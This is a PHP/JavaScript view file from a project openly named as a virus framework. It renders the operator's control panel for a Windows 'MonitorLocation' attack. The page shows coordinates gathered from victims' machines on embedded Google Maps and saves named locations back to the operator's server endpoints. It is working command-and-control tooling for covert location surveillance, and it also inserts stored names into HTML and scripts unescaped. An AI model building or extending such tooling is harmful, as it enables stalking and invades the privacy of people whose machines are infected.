<?php
/** @var \Kelvinho\Virus\Attack\Packages\Windows\Background\MonitorLocation\MonitorLocation $attack */
/** @var \Kelvinho\Virus\User\User $user */

use Kelvinho\Virus\Singleton\Timezone;
use function Kelvinho\Virus\formattedTime;

?>

<script>
    const gui = {
        "streamSidenavList": $("#streamSidenavList"),
        "savedSidenavList": $("#savedSidenavList"),
        "streamMap": $("#streamMap"),
        "savedMap": $("#savedMap"),
        "streamSidenav": $("#streamSidenav"),
        "savedSidenav": $("#savedSidenav"),
        "streamNav-save": $("#streamNav-save"),
        "savedNav-forget": $("#savedNav-forget"),
        "streamNavName": $("#streamNavName"),
        "savedNavName": $("#savedNavName")
    };

    function map(list, func) {
        const answer = [];
        for (let i = 0; i < list.length; i++) {
            answer.push(func(list[i], i));
        }
        return answer;
    }

    function timeConverter(UNIX_timestamp) {
        const a = new Date((UNIX_timestamp - (<?php echo Timezone::getUnixOffset($user->getTimezone()); ?>)) * 1000);
        //const a = new Date(UNIX_timestamp * 1000);
        const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
        const year = a.getFullYear();
        const month = months[a.getMonth()];
        const date = a.getDate();
        const hour = a.getHours();
        const min = a.getMinutes();
        const sec = a.getSeconds();
        return date + ' ' + month + ' ' + year + ' ' + hour + ':' + min + ':' + sec;
    }

    class Event {
        constructor(unixTime, lat, lng, acc, name, displayTime) {
            this.unixTime = unixTime;
            this.lat = lat;
            this.lng = lng;
            this.acc = acc;
            this.displayTime = displayTime;
            this.name = name ?? "";
            this.zoomLevel = Math.log2(591657550.5 / (parseInt(this.acc) * 18)) + 1;
        }

        renderMap() {
            return `<iframe src="https://maps.google.com/maps?q=` + this.lat + `,` + this.lng + `&z=` + Math.round(this.zoomLevel) + `&output=embed"
                                              width="100%"
                                              height="100%" style="border:0"></iframe>`;
        }

        export() {
            return JSON.stringify({
                "lat": this.lat,
                "lng": this.lng,
                "acc": this.acc,
                "name": this.name
            });
        }
    }

    class StreamEvents {
        constructor() {
            this.activeUnixTime = events.length < 1 ? 0 : eventKeys[0];
        }

        unbind() {
            eventKeys.forEach(function (unixTime) {
                $("#streamNav-" + events[unixTime].unixTime).off();
            });
            gui["streamNav-save"].off();
        }

        rebind() {
            const self = this;
            eventKeys.forEach(function (unixTime) {
                const finalUnixTime = unixTime;
                $("#streamNav-" + events[finalUnixTime].unixTime).on("click", function () {
                    self.unbind();
                    self.activeUnixTime = finalUnixTime;
                    self.render();
                    self.rebind();
                    closeStreamNav();
                });
            });
            gui["streamNav-save"].on("click", function () {
                if (!eventKeys.includes(self.activeUnixTime)) return;
                savedEvents.unbind();
                savedEvents.addEvent(self.activeUnixTime);
                savedEvents.render();
                savedEvents.rebind();
                savedEvents.updateServer();
                closeStreamNav();
            });
        }

        renderNav() {
            const self = this;
            gui.streamSidenavList.html("");
            if (eventKeys.length > 0)
                eventKeys.forEach(function (key) {
                    gui.streamSidenavList.append("<a id='streamNav-" + events[key].unixTime + "' " +
                        "style='cursor:pointer' " +
                        "class='" + (key === self.activeUnixTime ? "navActive" : "") + "' >" + events[key].displayTime + (events[key].name ? ", " + events[key].name : "") + "</a>");
                });
            else
                gui.streamSidenavList.append("<a>(No maps available)</a>");
            if (eventKeys.includes(this.activeUnixTime))
                gui.streamNavName.val(events[this.activeUnixTime].name);
        }

        renderMap() {
            gui.streamMap.html("");
            if (eventKeys.includes(this.activeUnixTime))
                gui.streamMap.append(events[this.activeUnixTime].renderMap());
        }

        render() {
            this.renderNav();
            this.renderMap();
        }

        updateMapName() {
            if (!eventKeys.includes(this.activeUnixTime)) return;
            events[this.activeUnixTime].name = gui.streamNavName.val();
            uploadEvent(this.activeUnixTime);
            streamEvents.unbind();
            savedEvents.unbind();
            streamEvents.renderNav();
            savedEvents.renderNav();
            streamEvents.rebind();
            savedEvents.rebind();
        }
    }

    class SavedEvents {
        constructor(unixTimes) {
            this.unixTimes = unixTimes.reverse();
            this.activeUnixTime = this.unixTimes.length < 1 ? 0 : this.unixTimes[0];
        }

        unbind() {
            eventKeys.forEach(function (unixTime) {
                $("#savedNav-" + events[unixTime].unixTime).off();
            });
            gui["savedNav-forget"].off();
        }

        removeEvent(unixTime) {
            for (let i = 0; i < this.unixTimes.length; i++) {
                if (this.unixTimes[i] === unixTime) {
                    this.unixTimes.splice(i, 1);
                    return;
                }
            }
        }

        addEvent(unixTime) {
            if (!this.unixTimes.includes(unixTime)) this.unixTimes.push(unixTime);
        }

        rebind() {
            const self = this;
            eventKeys.forEach(function (unixTime) {
                const finalUnixTime = unixTime;
                $("#savedNav-" + finalUnixTime).on("click", function () {
                    self.unbind();
                    self.activeUnixTime = finalUnixTime;
                    self.render();
                    self.rebind();
                    closeSavedNav();
                });
            });
            gui["savedNav-forget"].on("click", function () {
                if (!eventKeys.includes(self.activeUnixTime)) return;
                self.unbind();
                self.removeEvent(self.activeUnixTime);
                self.render();
                self.rebind();
                self.updateServer();
                closeSavedNav();
            });
        }

        renderNav() {
            const self = this;
            gui.savedSidenavList.html("");
            if (this.unixTimes.length > 0)
                this.unixTimes.forEach(function (key) {
                    gui.savedSidenavList.append("<a id='savedNav-" + events[key].unixTime + "' " +
                        "style='cursor:pointer' " +
                        "class='" + (key === self.activeUnixTime ? "navActive" : "") + "' >" + events[key].displayTime + (events[key].name ? ", " + events[key].name : "") + "</a>");
                });
            else
                gui.savedSidenavList.append("<a>(No maps available)</a>");
            if (eventKeys.includes(this.activeUnixTime))
                gui.savedNavName.val(events[this.activeUnixTime].name);
        }

        renderMap() {
            gui.savedMap.html("");
            if (eventKeys.includes(this.activeUnixTime)) gui.savedMap.append(events[this.activeUnixTime].renderMap());
        }

        render() {
            this.renderNav();
            this.renderMap();
        }

        export() {
            return JSON.stringify(this.unixTimes);
        }

        updateServer() {
            $.ajax({
                url: "<?php echo DOMAIN . "/vrs/" . $attack->getVirusId() . "/aks/" . $attack->getAttackId() . "/ctrls/updateSaved"; ?>",
                type: "POST",
                data: {
                    savedEvents: this.export()
                }
            });
        }

        updateMapName() {
            if (!eventKeys.includes(this.activeUnixTime)) return;
            events[this.activeUnixTime].name = gui.savedNavName.val();
            uploadEvent(this.activeUnixTime);
            streamEvents.renderNav();
            savedEvents.renderNav();
        }
    }

    // now let's load data

    const events = {<?php echo implode(", ", \Kelvinho\Virus\map($attack->getEvents(), function ($values, $unixTime) use ($user) {
            return $unixTime . ': new Event(' . $unixTime . ', "' . $values["lat"] . '", "' . $values["lng"] . '", "' . $values["acc"] . '", "' . $values["name"] . '", "' . formattedTime($unixTime + Timezone::getUnixOffset($user->getTimezone())) . '")';
        })); ?>};
    // all of these mess just because of type mismatch stuff. God damn I hate dynamic typing
    const eventKeysString = Object.keys(events);
    let eventKeys = [];
    for (let i = 0; i < eventKeysString.length; i++) eventKeys[i] = parseInt(eventKeysString[i]);
    eventKeys = eventKeys.reverse();
    const streamEvents = new StreamEvents();
    const savedEvents = new SavedEvents([<?php echo implode(", ", $attack->getSavedEvents()); ?>]);
    streamEvents.render();
    streamEvents.rebind();
    savedEvents.render();
    savedEvents.rebind();

    $(document).on("keydown", function (e) {
        if (e.key !== "Escape") return;
        closeStreamNav();
        closeSavedNav();
    });

    gui.streamNavName.on('keypress',function(e) {
        if(e.which === 13) streamEvents.updateMapName();
    });
    gui.savedNavName.on('keypress',function(e) {
        if(e.which === 13) savedEvents.updateMapName();
    });

    function uploadEvent(unixTime) {
        $.ajax({
            url: "<?php echo DOMAIN . "/vrs/" . $attack->getVirusId() . "/aks/" . $attack->getAttackId() . "/ctrls/updateEvent"; ?>",
            type: "POST",
            data: {
                event: events[unixTime].export(),
                unixTime: unixTime
            }
        });
    }

    function openStreamNav() {
        gui.streamSidenav.removeClass("sidenavClosed");
    }

    function closeStreamNav() {
        gui.streamSidenav.addClass("sidenavClosed");
    }

    function openSavedNav() {
        gui.savedSidenav.removeClass("sidenavClosed");
    }

    function closeSavedNav() {
        gui.savedSidenav.addClass("sidenavClosed");
    }
</script>